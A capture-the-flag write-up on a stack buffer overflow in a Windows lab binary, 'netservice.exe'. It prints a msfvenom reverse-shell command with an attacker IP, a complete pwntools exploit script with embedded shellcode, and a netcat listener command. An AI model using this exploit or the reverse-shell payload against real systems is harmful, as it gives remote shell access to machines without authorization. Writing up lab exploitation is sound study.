# Windows2 CTF Writeup

## Challenge Overview

The challenge involved exploiting a Windows binary named `netservice.exe` with the goal of achieving a reverse shell to the attacker's machine. The binary contained a vulnerability where user input was written directly into a buffer without bounds checking, enabling a classic buffer overflow.

## Analysis

When running the binary, it prompted for input. Upon analysis using tools for example **Ghidra** it was discovered that the input was copied into a stack buffer without proper checks, while also leaking a stack address beforehand which we could use in advance.

The program printed a stack address in the following format:

```
Stack leak: 0x64eec0
```

After this leak, sending an overly long input crashed the binary. Using `cyclic()` and `cyclic_find()` from pwntools, we determined the exact offset to EIP.

### Key Code Analysis

Relevant disassembly snippets:

```asm
mov eax, [esp+4]
call gets  ; unsafe, no length check
```

And:

```asm
printf("Stack leak: %p\n", esp + 0x20)
```

The combination of a stack leak and unsafe input makes this binary vulnerable to classic buffer overflow with shellcode injection.

## Exploitation and Payload Strategy

### Step 1: Finding the Offset

Sending a long `cyclic()` string crashed the binary and overwrote EIP. The crash value (`0x61647062`) indicated an offset of `4108` bytes:

```python
cyclic_find(0x61647062)  # → 4108
```

### Step 2: Using the Stack Leak

The program leaked a stack address. By placing a NOP sled and shellcode at that location, we could redirect EIP to the shellcode reliably.

```python
target_eip = p32(stack_leak + 16)
```

### Step 3: Generating Shellcode

A reverse shell was generated using `msfvenom`:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.196 LPORT=4444 EXITFUNC=thread -f python -b "\x00\x0a\x0d"
```

This shellcode was appended after a NOP sled, right after the EIP overwrite.

### Final Payload:

```python
payload = b"A" * 4108
payload += target_eip
payload += b"\x90" * 32
payload += shellcode
```

The exploit was sent via a script that connects to the vulnerable binary on the VM over port 1234.

### Python Automation Script:

```python
from pwn import *

conn = remote("192.168.1.108", 1234)
stack_leak = int(conn.recvline().strip().split(b': ')[1], 16)

offset = 4108
nop_sled = b'\x90' * 32

# msfvenom shellcode goes here
buf =  b""
buf += b"\xd9\xc1\xbd\xb5\x68\x9d\x1b\xd9\x74\x24\xf4\x5f"
buf += b"\x29\xc9\xb1\x52\x31\x6f\x17\x03\x6f\x17\x83\x5a"
buf += b"\x94\x7f\xee\x58\x8d\x02\x11\xa0\x4e\x63\x9b\x45"
buf += b"\x7f\xa3\xff\x0e\xd0\x13\x8b\x42\xdd\xd8\xd9\x76"
buf += b"\x56\xac\xf5\x79\xdf\x1b\x20\xb4\xe0\x30\x10\xd7"
buf += b"\x62\x4b\x45\x37\x5a\x84\x98\x36\x9b\xf9\x51\x6a"
buf += b"\x74\x75\xc7\x9a\xf1\xc3\xd4\x11\x49\xc5\x5c\xc6"
buf += b"\x1a\xe4\x4d\x59\x10\xbf\x4d\x58\xf5\xcb\xc7\x42"
buf += b"\x1a\xf1\x9e\xf9\xe8\x8d\x20\x2b\x21\x6d\x8e\x12"
buf += b"\x8d\x9c\xce\x53\x2a\x7f\xa5\xad\x48\x02\xbe\x6a"
buf += b"\x32\xd8\x4b\x68\x94\xab\xec\x54\x24\x7f\x6a\x1f"
buf += b"\x2a\x34\xf8\x47\x2f\xcb\x2d\xfc\x4b\x40\xd0\xd2"
buf += b"\xdd\x12\xf7\xf6\x86\xc1\x96\xaf\x62\xa7\xa7\xaf"
buf += b"\xcc\x18\x02\xa4\xe1\x4d\x3f\xe7\x6d\xa1\x72\x17"
buf += b"\x6e\xad\x05\x64\x5c\x72\xbe\xe2\xec\xfb\x18\xf5"
buf += b"\x13\xd6\xdd\x69\xea\xd9\x1d\xa0\x29\x8d\x4d\xda"
buf += b"\x98\xae\x05\x1a\x24\x7b\x89\x4a\x8a\xd4\x6a\x3a"
buf += b"\x6a\x85\x02\x50\x65\xfa\x33\x5b\xaf\x93\xde\xa6"
buf += b"\x38\x5c\xb6\xa9\x7c\x34\xc5\xa9\x6d\x99\x40\x4f"
buf += b"\xe7\x31\x05\xd8\x90\xa8\x0c\x92\x01\x34\x9b\xdf"
buf += b"\x02\xbe\x28\x20\xcc\x37\x44\x32\xb9\xb7\x13\x68"
buf += b"\x6c\xc7\x89\x04\xf2\x5a\x56\xd4\x7d\x47\xc1\x83"
buf += b"\x2a\xb9\x18\x41\xc7\xe0\xb2\x77\x1a\x74\xfc\x33"
buf += b"\xc1\x45\x03\xba\x84\xf2\x27\xac\x50\xfa\x63\x98"
buf += b"\x0c\xad\x3d\x76\xeb\x07\x8c\x20\xa5\xf4\x46\xa4"
buf += b"\x30\x37\x59\xb2\x3c\x12\x2f\x5a\x8c\xcb\x76\x65"
buf += b"\x21\x9c\x7e\x1e\x5f\x3c\x80\xf5\xdb\x5c\x63\xdf"
buf += b"\x11\xf5\x3a\x8a\x9b\x98\xbc\x61\xdf\xa4\x3e\x83"
buf += b"\xa0\x52\x5e\xe6\xa5\x1f\xd8\x1b\xd4\x30\x8d\x1b"
buf += b"\x4b\x30\x84"

target_eip = p32(stack_leak + 16)

payload = b"A" * offset + target_eip + nop_sled + buf

input("Start netcat listener and press Enter...")
conn.sendline(payload)
conn.interactive()
```

## Result and Solution

By sending the payload and simultaneously running a netcat listener on port 4444, we successfully obtained a reverse shell on the VM. The shell ran in the context of the user who started `netservice.exe`.

```bash
ncat -lvnp 4444
```

In the shell:

```cmd
C:\Users\nali> whoami
desktop-m94ck2e
```

## Conclusion and Lessons

- Stack leaks can be leveraged to accurately target NOP sleds.
- Classic buffer overflows remain powerful when input is not properly validated.
- Using `gets()` in modern binaries is a severe risk.
- This challenge reinforced knowledge of offset calculation, shellcode injection, and building reliable exploits.

## References

- ![alt text](/img/image-16.png)
- ![alt text](/img/image-17.png)
